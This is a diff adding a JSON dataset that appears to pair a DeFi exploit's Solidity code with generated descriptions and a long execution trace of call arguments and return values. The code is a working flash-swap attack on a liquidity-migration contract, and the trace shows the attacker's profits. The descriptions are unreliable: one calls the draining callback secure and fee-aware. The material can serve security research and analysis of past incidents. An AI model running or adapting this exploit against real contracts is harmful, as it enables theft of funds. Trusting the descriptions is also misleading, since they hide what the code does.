@@ -1,0 +1,709 @@
+[
+    {
+        "id": "23756",
+        "args": "",
+        "original_code": "    function testExploit() public {\n        payable(address(0)).transfer(address(this).balance);\n        emit log_named_uint(\"Before exploit, USDC  balance of attacker:\", wbnb.balanceOf(msg.sender));\n        wbnbBusdPair.swap(2400e18, 0, address(this), new bytes(1));\n        emit log_named_uint(\"After exploit, USDC  balance of attacker:\", wbnb.balanceOf(msg.sender));\n    }\n\n",
+        "description": "1. Core functions:  \nThe `testExploit` function is designed to perform a specific operation involving transferring funds and swapping tokens. First, it sends all the balance of the contract to a specific address (address 0). Then, it triggers a swap operation on a token pair (WBNB/BUSD) with a predefined amount. Finally, it logs the attacker's WBNB balance before and after the swap to track changes.\n\n2. Security mechanism:  \nThe function does not include explicit security mechanisms like access control or input validation. It is marked as `public`, meaning anyone can call it. The use of `payable` and `transfer` ensures that the funds are sent correctly, but there are no safeguards to prevent misuse or unauthorized access. The function relies on the external `swap` function of the token pair, which may have its own security checks.\n\n3. Parameter Function:  \nThe function does not take any parameters directly. However, it uses hardcoded values for the swap operation: `2400e18` (representing the amount of tokens to swap) and `0` (indicating no minimum amount for the other token). The `address(this)` specifies the contract itself as the recipient of the swap, and `new bytes(1)` is a placeholder for optional data.\n\n4. Return description:  \nThe function does not return any value. Instead, it emits two log events to display the attacker's WBNB balance before and after the swap. These logs are used to observe the impact of the swap operation on the attacker's token holdings.\n\nIn summary,  \nThe `testExploit` function is a simple yet potentially risky operation that transfers funds and performs a token swap. It lacks built-in security measures and relies on hardcoded values for the swap. The function logs the attacker's WBNB balance to track changes but does not return any value directly.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1050657",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2534",
+        "args": "DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "1023226",
+        "args": "2400000000000000000000 [2.4e21], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "29962",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2400000000000000000000 [2.4e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "962328",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2400000000000000000000 [2.4e21], 0, 0x00",
+        "original_code": "    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n        address[] memory path = new address[](2);\n        path[0] = address(wbnb);\n        path[1] = address(gym);\n        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            600e18, 0, path, address(this), type(uint32).max\n        );\n        pancakeRouter.addLiquidity(\n            address(wbnb),\n            address(gym),\n            wbnb.balanceOf(address(this)),\n            gymnet.balanceOf(address(liquidityMigrationV2)),\n            0,\n            0,\n            address(this),\n            type(uint32).max\n        );\n        liquidityMigrationV2.migrate(wbnbGymPair.balanceOf(address(this)));\n        pancakeRouter.removeLiquidityETHSupportingFeeOnTransferTokens(\n            address(gymnet), wbnbGymnetPair.balanceOf(address(this)), 0, 0, address(this), type(uint32).max\n        );\n        wbnb.deposit{value: address(this).balance}();\n        path[0] = address(gym);\n        path[1] = address(wbnb);\n        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            gym.balanceOf(address(this)), 0, path, address(this), type(uint32).max\n        );\n        path[0] = address(gymnet);\n        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            gymnet.balanceOf(address(this)), 0, path, address(this), type(uint32).max\n        );\n        wbnb.transfer(msg.sender, ((amount0 / 9975) * 10_000) + 10_000);\n        wbnb.transfer(tx.origin, wbnb.balanceOf(address(this)));\n    }\n\n",
+        "description": "1. **Core functions**:  \n   This function is designed to handle a series of operations related to swapping tokens, adding and removing liquidity, and transferring funds. It starts by swapping a specific amount of tokens while supporting fees on transfers. Then, it adds liquidity to a token pair, migrates liquidity from one contract to another, and removes liquidity while supporting fees. Finally, it deposits Ether into a wrapped token, performs additional token swaps, and transfers the resulting funds to the sender and the transaction origin.\n\n2. **Security mechanism**:  \n   - The function is marked as `public`, meaning it can be called by anyone, but it relies on external contracts (like `pancakeRouter` and `liquidityMigrationV2`) to execute its logic.  \n   - It uses `type(uint32).max` to set a maximum deadline for transactions, ensuring they don\u2019t hang indefinitely.  \n   - The function ensures that tokens are transferred only after all operations are completed, reducing the risk of leaving funds in an inconsistent state.  \n\n3. **Parameter Function**:  \n   - `sender`: The address initiating the call, used to identify who triggered the function.  \n   - `amount0` and `amount1`: These represent the amounts of two tokens involved in the operation, used to calculate the final transfer amounts.  \n   - `data`: Additional data passed to the function, though it\u2019s not directly used in this specific implementation.  \n\n4. **Return description**:  \n   The function does not return any value directly. Instead, it performs calculations to determine the amounts of tokens to transfer. For example, it calculates the amount of `wbnb` to transfer to the sender based on `amount0` and a fixed formula (`(amount0 / 9975) * 10_000 + 10_000`). The remaining balance of `wbnb` is then transferred to the transaction origin.  \n\n**In summary**,  \nThis function orchestrates a complex series of token swaps, liquidity management, and fund transfers. It ensures operations are completed within a set timeframe and calculates specific amounts for transfers based on input parameters. While it relies on external contracts for execution, it includes measures to handle fees and deadlines securely.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "98728",
+        "args": "600000000000000000000 [6e20], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xE98D920370d87617eb11476B41BF4BE4C556F3f8], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4294967295 [4.294e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "10225",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x8dC058bA568f7D992c60DE3427e7d6FC014491dB, 600000000000000000000 [6e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2906",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "48224671390454476706 [4.822e19], 7139690912895574196500916 [7.139e24], 1649513937 [1.649e9]"
+    },
+    {
+        "id": "534",
+        "args": "0x8dC058bA568f7D992c60DE3427e7d6FC014491dB",
+        "original_code": null,
+        "description": null,
+        "return_value": "648224671390454476706 [6.482e20]"
+    },
+    {
+        "id": "69122",
+        "args": "0, 6607301685554764671307615 [6.607e24], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "34370",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6607301685554764671307615 [6.607e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x8dC058bA568f7D992c60DE3427e7d6FC014491dB",
+        "original_code": null,
+        "description": null,
+        "return_value": "648224671390454476706 [6.482e20]"
+    },
+    {
+        "id": "906",
+        "args": "0x8dC058bA568f7D992c60DE3427e7d6FC014491dB",
+        "original_code": null,
+        "description": null,
+        "return_value": "532389227340809525193301 [5.323e23]"
+    },
+    {
+        "id": "906",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "6607301685554764671307615 [6.607e24]"
+    },
+    {
+        "id": "534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1800000000000000000000 [1.8e21]"
+    },
+    {
+        "id": "2668",
+        "args": "0x1BEfe6f3f0E8edd2D4D15Cae97BAEe01E51ea4A4",
+        "original_code": null,
+        "description": null,
+        "return_value": "1450998605164940945782286 [1.45e24]"
+    },
+    {
+        "id": "103270",
+        "args": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xE98D920370d87617eb11476B41BF4BE4C556F3f8, 1800000000000000000000 [1.8e21], 1450998605164940945782286 [1.45e24], 0, 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4294967295 [4.294e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1766701964874549928839 [1.766e21], 1450998605164940945782286 [1.45e24], 47428731589486658506294 [4.742e22]"
+    },
+    {
+        "id": "2676",
+        "args": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xE98D920370d87617eb11476B41BF4BE4C556F3f8",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x8dC058bA568f7D992c60DE3427e7d6FC014491dB"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "648224671390454476706 [6.482e20], 532389227340809525193301 [5.323e23], 1649518711 [1.649e9]"
+    },
+    {
+        "id": "3425",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x8dC058bA568f7D992c60DE3427e7d6FC014491dB, 1766701964874549928839 [1.766e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "8408",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x8dC058bA568f7D992c60DE3427e7d6FC014491dB, 1450998605164940945782286 [1.45e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "78381",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "47428731589486658506294 [4.742e22]"
+    },
+    {
+        "id": "534",
+        "args": "0x8dC058bA568f7D992c60DE3427e7d6FC014491dB",
+        "original_code": null,
+        "description": null,
+        "return_value": "2414926636265004405545 [2.414e21]"
+    },
+    {
+        "id": "906",
+        "args": "0x8dC058bA568f7D992c60DE3427e7d6FC014491dB",
+        "original_code": null,
+        "description": null,
+        "return_value": "1983387832505750470975587 [1.983e24]"
+    },
+    {
+        "id": "2354",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xB1b9b4bbe8a92d535F5Df2368e7Fd2ecFB3A1950"
+    },
+    {
+        "id": "537",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "47428731589486658506294 [4.742e22]"
+    },
+    {
+        "id": "395059",
+        "args": "47428731589486658506294 [4.742e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "27476",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1BEfe6f3f0E8edd2D4D15Cae97BAEe01E51ea4A4, 47428731589486658506294 [4.742e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "154788",
+        "args": "0xE98D920370d87617eb11476B41BF4BE4C556F3f8, 47428731589486658506294 [4.742e22], 0, 0, 0x1BEfe6f3f0E8edd2D4D15Cae97BAEe01E51ea4A4, 1649518711 [1.649e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1450998605164940945782073 [1.45e24], 1766701964874549928838 [1.766e21]"
+    },
+    {
+        "id": "27476",
+        "args": "0x1BEfe6f3f0E8edd2D4D15Cae97BAEe01E51ea4A4, 0x8dC058bA568f7D992c60DE3427e7d6FC014491dB, 47428731589486658506294 [4.742e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "94615",
+        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E",
+        "original_code": null,
+        "description": null,
+        "return_value": "1766701964874549928838 [1.766e21], 1450998605164940945782073 [1.45e24]"
+    },
+    {
+        "id": "534",
+        "args": "0x8dC058bA568f7D992c60DE3427e7d6FC014491dB",
+        "original_code": null,
+        "description": null,
+        "return_value": "2414926636265004405545 [2.414e21]"
+    },
+    {
+        "id": "906",
+        "args": "0x8dC058bA568f7D992c60DE3427e7d6FC014491dB",
+        "original_code": null,
+        "description": null,
+        "return_value": "1983387832505750470975587 [1.983e24]"
+    },
+    {
+        "id": "354",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xB1b9b4bbe8a92d535F5Df2368e7Fd2ecFB3A1950"
+    },
+    {
+        "id": "25162",
+        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 1766701964874549928838 [1.766e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "29570",
+        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 1450998605164940945782073 [1.45e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x8dC058bA568f7D992c60DE3427e7d6FC014491dB",
+        "original_code": null,
+        "description": null,
+        "return_value": "648224671390454476707 [6.482e20]"
+    },
+    {
+        "id": "906",
+        "args": "0x8dC058bA568f7D992c60DE3427e7d6FC014491dB",
+        "original_code": null,
+        "description": null,
+        "return_value": "532389227340809525193514 [5.323e23]"
+    },
+    {
+        "id": "12470",
+        "args": "0x1BEfe6f3f0E8edd2D4D15Cae97BAEe01E51ea4A4, 1450998605164940945782073 [1.45e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "9223",
+        "args": "1766701964874549928838 [1.766e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "83",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "55",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "188969",
+        "args": "0x3a0d9d7764FAE860A659eb96A500F1323b411e68, 1450998605164940945782073 [1.45e24], 0, 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1649518711 [1.649e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1191056586551219012447589 [1.191e24], 1766701964874549928838 [1.766e21], 45693216410917448247144 [4.569e22]"
+    },
+    {
+        "id": "2676",
+        "args": "0x3a0d9d7764FAE860A659eb96A500F1323b411e68, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x627F27705c8C283194ee9A85709f7BD9E38A1663"
+    },
+    {
+        "id": "2893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "7677163643402146827976102 [7.677e24], 11387586657604004961399 [1.138e22], 1649518672 [1.649e9]"
+    },
+    {
+        "id": "41171",
+        "args": "0x1BEfe6f3f0E8edd2D4D15Cae97BAEe01E51ea4A4, 0x627F27705c8C283194ee9A85709f7BD9E38A1663, 1191056586551219012447589 [1.191e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "21974",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "8062",
+        "args": "0x627F27705c8C283194ee9A85709f7BD9E38A1663, 1766701964874549928838 [1.766e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "96309",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "45693216410917448247144 [4.569e22]"
+    },
+    {
+        "id": "668",
+        "args": "0x627F27705c8C283194ee9A85709f7BD9E38A1663",
+        "original_code": null,
+        "description": null,
+        "return_value": "8868220229953365840423691 [8.868e24]"
+    },
+    {
+        "id": "534",
+        "args": "0x627F27705c8C283194ee9A85709f7BD9E38A1663",
+        "original_code": null,
+        "description": null,
+        "return_value": "13154288622478554890237 [1.315e22]"
+    },
+    {
+        "id": "354",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xB1b9b4bbe8a92d535F5Df2368e7Fd2ecFB3A1950"
+    },
+    {
+        "id": "537",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "45693216410917448247144 [4.569e22]"
+    },
+    {
+        "id": "175487",
+        "args": "0x3a0d9d7764FAE860A659eb96A500F1323b411e68, 45693216410917448247144 [4.569e22], 0, 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4294967295 [4.294e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1766701964874549928837 [1.766e21]"
+    },
+    {
+        "id": "27476",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x627F27705c8C283194ee9A85709f7BD9E38A1663, 45693216410917448247144 [4.569e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "87445",
+        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E",
+        "original_code": null,
+        "description": null,
+        "return_value": "1191056586551219012447581 [1.191e24], 1766701964874549928837 [1.766e21]"
+    },
+    {
+        "id": "668",
+        "args": "0x627F27705c8C283194ee9A85709f7BD9E38A1663",
+        "original_code": null,
+        "description": null,
+        "return_value": "8868220229953365840423691 [8.868e24]"
+    },
+    {
+        "id": "534",
+        "args": "0x627F27705c8C283194ee9A85709f7BD9E38A1663",
+        "original_code": null,
+        "description": null,
+        "return_value": "13154288622478554890237 [1.315e22]"
+    },
+    {
+        "id": "354",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xB1b9b4bbe8a92d535F5Df2368e7Fd2ecFB3A1950"
+    },
+    {
+        "id": "24440",
+        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 1191056586551219012447581 [1.191e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "23162",
+        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 1766701964874549928837 [1.766e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "668",
+        "args": "0x627F27705c8C283194ee9A85709f7BD9E38A1663",
+        "original_code": null,
+        "description": null,
+        "return_value": "7677163643402146827976110 [7.677e24]"
+    },
+    {
+        "id": "534",
+        "args": "0x627F27705c8C283194ee9A85709f7BD9E38A1663",
+        "original_code": null,
+        "description": null,
+        "return_value": "11387586657604004961400 [1.138e22]"
+    },
+    {
+        "id": "668",
+        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E",
+        "original_code": null,
+        "description": null,
+        "return_value": "1191056586661219012447581 [1.191e24]"
+    },
+    {
+        "id": "39326",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1191056586661219012447581 [1.191e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "9223",
+        "args": "1766701964874549928837 [1.766e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "83",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "55",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2074",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "906",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "5156303080389823725525329 [5.156e24]"
+    },
+    {
+        "id": "35197",
+        "args": "5156303080389823725525329 [5.156e24], 0, [0xE98D920370d87617eb11476B41BF4BE4C556F3f8, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4294967295 [4.294e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "6408",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x8dC058bA568f7D992c60DE3427e7d6FC014491dB, 5156303080389823725525329 [5.156e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1799999999999999999998 [1.799e21]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "648224671390454476707 [6.482e20], 532389227340809525193514 [5.323e23], 1649518711 [1.649e9]"
+    },
+    {
+        "id": "906",
+        "args": "0x8dC058bA568f7D992c60DE3427e7d6FC014491dB",
+        "original_code": null,
+        "description": null,
+        "return_value": "5688692307730633250718843 [5.688e24]"
+    },
+    {
+        "id": "18730",
+        "args": "587421306631689986733 [5.874e20], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3262",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 587421306631689986733 [5.874e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x8dC058bA568f7D992c60DE3427e7d6FC014491dB",
+        "original_code": null,
+        "description": null,
+        "return_value": "60803364758764489974 [6.08e19]"
+    },
+    {
+        "id": "906",
+        "args": "0x8dC058bA568f7D992c60DE3427e7d6FC014491dB",
+        "original_code": null,
+        "description": null,
+        "return_value": "5688692307730633250718843 [5.688e24]"
+    },
+    {
+        "id": "534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2387421306631689986731 [2.387e21]"
+    },
+    {
+        "id": "668",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1191056586661219012447581 [1.191e24]"
+    },
+    {
+        "id": "70397",
+        "args": "1191056586661219012447581 [1.191e24], 0, [0x3a0d9d7764FAE860A659eb96A500F1323b411e68, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4294967295 [4.294e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "42134",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x627F27705c8C283194ee9A85709f7BD9E38A1663, 1191056586661219012447581 [1.191e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2387421306631689986731 [2.387e21]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "7677163643402146827976110 [7.677e24], 11387586657604004961400 [1.138e22], 1649518711 [1.649e9]"
+    },
+    {
+        "id": "668",
+        "args": "0x627F27705c8C283194ee9A85709f7BD9E38A1663",
+        "original_code": null,
+        "description": null,
+        "return_value": "8749114571397243939178934 [8.749e24]"
+    },
+    {
+        "id": "18492",
+        "args": "0, 1392157739230075647764 [1.392e21], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3262",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1392157739230075647764 [1.392e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "668",
+        "args": "0x627F27705c8C283194ee9A85709f7BD9E38A1663",
+        "original_code": null,
+        "description": null,
+        "return_value": "8749114571397243939178934 [8.749e24]"
+    },
+    {
+        "id": "534",
+        "args": "0x627F27705c8C283194ee9A85709f7BD9E38A1663",
+        "original_code": null,
+        "description": null,
+        "return_value": "9995428918373929313636 [9.995e21]"
+    },
+    {
+        "id": "534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "3779579045861765634495 [3.779e21]"
+    },
+    {
+        "id": "3262",
+        "args": "0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16, 2406015037593984970000 [2.406e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1373564008267780664495 [1.373e21]"
+    },
+    {
+        "id": "23162",
+        "args": "DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], 1373564008267780664495 [1.373e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16",
+        "original_code": null,
+        "description": null,
+        "return_value": "440310093449496785764002 [4.403e23]"
+    },
+    {
+        "id": "2531",
+        "args": "0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16",
+        "original_code": null,
+        "description": null,
+        "return_value": "186277255430999031181028000 [1.862e26]"
+    },
+    {
+        "id": "534",
+        "args": "DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1373564008267780664495 [1.373e21]"
+    }
+]
